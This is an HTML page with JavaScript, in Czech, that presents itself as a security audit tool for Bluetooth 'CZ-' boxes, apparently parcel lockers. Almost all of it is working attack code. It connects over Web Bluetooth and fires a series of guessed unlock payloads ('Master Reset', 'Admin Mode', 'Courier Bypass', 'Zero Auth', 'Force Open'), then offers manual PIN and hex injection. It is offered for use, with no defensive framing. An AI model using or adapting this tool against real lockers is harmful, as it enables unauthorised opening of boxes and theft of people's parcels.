<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BOX SECURITY AUDIT v4.0 (ULTIMATE) 🔱</title>
    <style>
        body { font-family: 'Courier New', monospace; background: #050505; color: #00ff41; padding: 15px; margin: 0; }
        .header { border-bottom: 2px solid #00ff41; padding-bottom: 10px; margin-bottom: 20px; text-align: center; }
        .panel { border: 1px solid #00ff41; padding: 15px; border-radius: 5px; margin-bottom: 15px; background: rgba(0, 255, 65, 0.05); }
        button { background: #000; color: #00ff41; border: 1px solid #00ff41; padding: 12px; margin: 5px 0; cursor: pointer; width: 100%; font-size: 14px; font-weight: bold; text-transform: uppercase; }
        button:hover { background: #00ff41; color: #000; }
        button:disabled { border-color: #444; color: #444; cursor: not-allowed; }
        input { background: #000; color: #00ff41; border: 1px solid #00ff41; padding: 10px; width: calc(100% - 24px); margin-bottom: 10px; }
        #log { background: #000; border: 1px solid #333; height: 350px; overflow-y: scroll; padding: 10px; font-size: 11px; color: #00ff41; line-height: 1.4; }
        .status-bar { font-size: 12px; margin-bottom: 10px; color: #fff; }
        .danger { border-color: #ff0000; color: #ff0000; }
        .danger:hover { background: #ff0000; color: #000; }
    </style>
</head>
<body>

<div class="header">
    <h2>SYSTEM AUDIT: CZ-BOX 🔱</h2>
</div>

<div class="panel">
    <div class="status-bar" id="status">STATUS: DISCONNECTED</div>
    <button onclick="connect()">1. NAVÁZAT SPOJENÍ (SCAN)</button>
</div>

<div class="panel">
    <strong>MAXIMÁLNÍ ÚTOČNÝ VEKTOR:</strong>
    <button class="danger" id="attackBtn" onclick="startUltimateAttack()" disabled>SPUSTIT ULTIMATE ATTACK</button>
</div>

<div class="panel">
    <strong>MANUÁLNÍ VSTUP (TEXT/PIN):</strong>
    <input type="text" id="userInput" placeholder="Zadej PIN nebo název boxu">
    <button onclick="sendManualText()">ODESLAT TEXT</button>
    <button onclick="sendManualHex()">ODESLAT HEX</button>
</div>

<div id="log">--- SYSTÉM PŘIPRAVEN K AUDITU ---<br></div>

<script>
    let device, server, service, characteristic;
    let deviceName = "";

    const SERVICE_UUID = '7a626f78-0ad1-46c3-9fc9-fbd4bdc5d197';
    const CHARACTERISTIC_UUID = '7a626f7a-0ad1-46c3-9fc9-fbd4bdc5d197';

    function log(msg) {
        const logDiv = document.getElementById('log');
        const now = new Date().toLocaleTimeString();
        logDiv.innerHTML += `[${now}] > ${msg}<br>`;
        logDiv.scrollTop = logDiv.scrollHeight;
    }

    async function connect() {
        try {
            log("Skenuji CZ- zařízení...");
            device = await navigator.bluetooth.requestDevice({
                filters: [{ namePrefix: 'CZ-' }],
                optionalServices: [SERVICE_UUID]
            });

            log(`Nalezeno: ${device.name}. Připojuji se...`);
            deviceName = device.name;
            
            server = await device.gatt.connect();
            service = await server.getPrimaryService(SERVICE_UUID);
            characteristic = await service.getCharacteristic(CHARACTERISTIC_UUID);

            document.getElementById('status').innerText = `STATUS: CONNECTED [${deviceName}]`;
            document.getElementById('attackBtn').disabled = false;
            log("✅ KANÁL OTEVŘEN. Připraven k injekci dat.");

        } catch (error) {
            log("❌ CHYBA: " + error);
        }
    }

    async function sendRaw(data) {
        if (!characteristic) return;
        try {
            await characteristic.writeValue(data);
            return true;
        } catch (e) {
            return false;
        }
    }

    async function startUltimateAttack() {
        log("🚀 SPUŠTĚN ULTIMATE ATTACK (Série 12 vektorů)...");
        
        const vectors = [
            { n: "Service Start", d: new Uint8Array([0x01]) },
            { n: "Master Reset", d: new Uint8Array([0x00]) },
            { n: "Admin Mode", d: new Uint8Array([0x01, 0x02, 0x03, 0x04]) },
            { n: "Unlock Pulse", d: new Uint8Array([0x55, 0xAA]) },
            { n: "Courier Bypass", d: new TextEncoder().encode("OPEN") },
            { n: "Device ID Key", d: new TextEncoder().encode(deviceName) },
            { n: "Zero Auth", d: new TextEncoder().encode("000000") },
            { n: "Serial Echo", d: new Uint8Array([0x43, 0x5A, 0x2D, 0x33, 0x33, 0x38, 0x4B]) },
            { n: "Overflow", d: new Uint8Array([0xFF, 0xFF, 0xFF, 0xFF]) },
            { n: "Legacy Code", d: new Uint8Array([0x0A, 0x0D]) },
            { n: "Status Check", d: new Uint8Array([0x3F]) },
            { n: "Force Open", d: new Uint8Array([0x01, 0x00, 0x01]) }
        ];

        for (const v of vectors) {
            log(`Zkouším: ${v.n}...`);
            const success = await sendRaw(v.d);
            if (success) log(`   -> Paket doručen.`);
            await new Promise(r => setTimeout(r, 600));
        }
        log("🏁 ÚTOK DOKONČEN. Zkontroluj mechanický stav.");
    }

    async function sendManualText() {
        const val = document.getElementById('userInput').value;
        if (!val) return;
        log(`Ruční text: ${val}`);
        await sendRaw(new TextEncoder().encode(val));
    }

    async function sendManualHex() {
        const val = document.getElementById('userInput').value;
        if (!val) return;
        try {
            const hex = new Uint8Array(val.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
            log(`Ruční HEX: ${val}`);
            await sendRaw(hex);
        } catch (e) { log("❌ Neplatný HEX."); }
    }
</script>

</body>
</html>
